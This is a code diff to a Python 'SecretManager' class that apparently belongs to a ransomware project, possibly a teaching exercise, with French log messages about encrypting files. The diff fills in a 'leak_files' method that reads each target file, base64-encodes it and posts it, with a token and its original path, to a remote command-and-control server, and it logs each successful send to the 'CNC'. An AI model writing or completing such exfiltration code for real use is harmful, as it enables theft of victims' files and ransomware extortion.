@@ -121,9 +121,34 @@ class SecretManager:
                 self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")
 
 
-    def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
+    def leak_files(self, files: List[str]) -> None:
+        for file_path in files:
+            try:
+                with open(file_path, "rb") as f:
+                    file_data = f.read()
+
+                file_name = os.path.basename(file_path)
+                original_path = os.path.dirname(file_path)
+                b64_file_data = self.bin_to_b64(file_data)
+
+                url = f"http://{self._remote_host_port}/file"
+
+                data = {
+                    "token": self.get_hex_token(),
+                    "file_data": b64_file_data,
+                    "file_name": file_name,
+                    "original_path": original_path
+                }
+
+                response = requests.post(url, json=data, params={"token": self.get_hex_token()})
+
+                if response.status_code != 200:
+                    self._log.error(f"Failed to send file {file_path} to CNC: {response.text}")
+                else:
+                    self._log.info(f"File {file_path} sent to CNC successfully")
+            except Exception as e:
+                self._log.error(f"Error sending file {file_path} to CNC: {e}")
+
 
     def clean(self) -> None:
         # Remove local cryptographic data (salt.bin and token.bin)
